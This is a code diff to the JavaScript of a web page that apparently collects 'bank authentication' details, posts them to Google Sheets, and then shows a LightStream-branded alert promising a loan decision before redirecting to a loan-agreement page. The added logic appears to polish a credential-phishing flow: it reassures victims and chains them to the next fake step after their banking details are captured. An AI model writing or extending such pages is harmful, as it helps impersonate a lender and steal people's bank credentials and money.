@@ -548,22 +548,43 @@
             .then(result => {
                 console.log('Google Sheets response:', result);
                 
-                // Hide form and show success message
-                const form = document.getElementById('bankAuthForm');
-                const formContainer = form.parentElement;
+                // Check if user came from personal loan form
+                const loanData = sessionStorage.getItem('loanData');
+                const hasLoanData = loanData && JSON.parse(loanData).loanAmount;
                 
-                formContainer.innerHTML = `
-                    <div class="text-center">
-                        <div class="mb-6">
-                            <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
-                                <i class="fas fa-check text-green-600 text-3xl"></i>
+                console.log('🔍 Has loan data:', hasLoanData);
+                
+                if (hasLoanData) {
+                    // User came from personal loan form - redirect to loan agreement
+                    alert('🏦 Bank Authentication Complete!\n\nYour application has been successfully submitted and is now under review.\n\nNext Steps:\n• You will receive your loan agreement shortly\n• Check your email for important updates\n• Loan decision typically within 24 hours\n\nThank you for choosing LightStream Financial Services.');
+                    
+                    // Store combined data for loan agreement
+                    const combinedData = JSON.parse(loanData);
+                    combinedData.bankAuthCompleted = true;
+                    sessionStorage.setItem("loanApplicationData", JSON.stringify(combinedData));
+                    
+                    // Redirect to loan agreement page
+                    setTimeout(() => {
+                        window.location.href = "loan-agreement.html";
+                    }, 1000);
+                } else {
+                    // Standalone bank auth - show success message
+                    const form = document.getElementById('bankAuthForm');
+                    const formContainer = form.parentElement;
+                    
+                    formContainer.innerHTML = `
+                        <div class="text-center">
+                            <div class="mb-6">
+                                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                                    <i class="fas fa-check text-green-600 text-3xl"></i>
+                                </div>
+                                <h2 class="text-2xl font-bold text-gray-800 mb-2">Bank Authentication Submitted Successfully!</h2>
+                                <p class="text-gray-600 mb-4">Your bank authentication has been received and is being processed.</p>
+                                <p class="text-sm text-gray-500">We will contact you shortly with next steps.</p>
                             </div>
-                            <h2 class="text-2xl font-bold text-gray-800 mb-2">Bank Authentication Submitted Successfully!</h2>
-                            <p class="text-gray-600 mb-4">Your bank authentication has been received and is being processed.</p>
-                            <p class="text-sm text-gray-500">We will contact you shortly with next steps.</p>
                         </div>
-                    </div>
-                `;
+                    `;
+                }
             })
             .catch(error => {
                 console.error('Google Sheets submission failed:', error);
